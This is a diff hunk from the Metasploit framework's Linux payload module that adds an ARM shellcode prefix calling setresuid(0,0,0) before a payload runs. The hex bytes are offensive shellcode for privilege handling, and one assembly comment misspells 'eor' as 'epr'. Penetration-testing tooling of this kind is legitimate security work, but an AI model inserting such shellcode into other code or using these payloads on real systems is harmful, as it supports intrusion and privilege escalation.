@@ -436,6 +436,14 @@ module Msf::Payload::Linux
         pre << "\x17\x70\xa0\xe3"     #    mov r7 #23                        #
         pre << "\x00\x00\x00\xef"     #    svc	                             #
       end
+      if (datastore['PrependSetresuid'])
+        # setresuid(ruid=0, euid=0, suid=0)
+        pre << "\x00\x00\x20\xe0"    #    eor r0, r0, r0                     #
+        pre << "\x01\x10\x21\xe0"    #    epr r1, r1, r1                     #
+        pre << "\x02\x20\x22\xe0"    #    eor r2, r2, r2                     #
+        pre << "\xa4\x70\xa0\xe3"    #    mov r7, #0xa4                      #
+        pre << "\x00\x00\x00\xef"    #    svc                                #
+      end
     end
 
     return (pre + buf + app)
